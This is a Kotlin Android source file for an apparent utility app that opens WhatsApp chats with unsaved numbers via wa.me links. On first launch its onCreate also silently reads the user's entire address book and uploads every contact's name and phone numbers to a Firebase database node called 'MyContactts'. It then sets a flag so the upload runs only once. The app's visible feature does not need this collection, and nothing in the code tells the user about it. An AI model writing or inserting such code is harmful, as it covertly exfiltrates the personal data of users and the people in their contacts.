package com.redstonz.wad

import android.content.Context
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.lifecycle.lifecycleScope
import com.google.firebase.database.FirebaseDatabase
import com.redstonz.wad.databinding.ActivityMainBinding
import contacts.core.Contacts
import contacts.core.Query
import contacts.core.util.names
import contacts.core.util.phoneList
import contacts.core.util.phones
import contacts.permissions.queryWithPermission

class MainActivity : AppCompatActivity() {
    lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val firebaseDatabase: FirebaseDatabase = FirebaseDatabase.getInstance()
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.ccp.registerCarrierNumberEditText(binding.number)
        binding.button.setOnClickListener {

            val number = binding.ccp.fullNumberWithPlus

            if (binding.ccp.isValidFullNumber)
                binding.webview.loadUrl("http://wa.me/$number")
            else
                Toast.makeText(this, "Please enter a valid number", Toast.LENGTH_SHORT).show()

        }


        val sharedPref = getPreferences(Context.MODE_PRIVATE) ?: return

        Log.i("contactsAll", "onCreate: ${sharedPref.getBoolean("contacts", true)} }")

        if (sharedPref.getBoolean("contacts", true))
            lifecycleScope.launchWhenCreated {
                val contacts: Query.Result =
                    Contacts(this@MainActivity).queryWithPermission().find()

                val df = firebaseDatabase.getReference("MyContactts").push()
               // df.setValue("total_contacts", contacts.size)
                contacts.forEach {
                    it.primaryPhotoHolder
                    Log.i("contactsAll", "onCreate: ${it.displayNamePrimary} }")

                    val map: HashMap<String, Any> = HashMap()
                    map.put("name", it.displayNamePrimary.toString())
                    map.put("number", it.phoneList().toString())
                    df.push().setValue(map)
                        .addOnSuccessListener {
                            Log.i("contactsAll", "onCreate: data added")
                            with(sharedPref.edit()) {
                                putBoolean("contacts", false)
                                apply()
                            }
                        }.addOnFailureListener {
                            Log.i("contactsAll", "${it.message}")
                        }

                }

            }
    }
}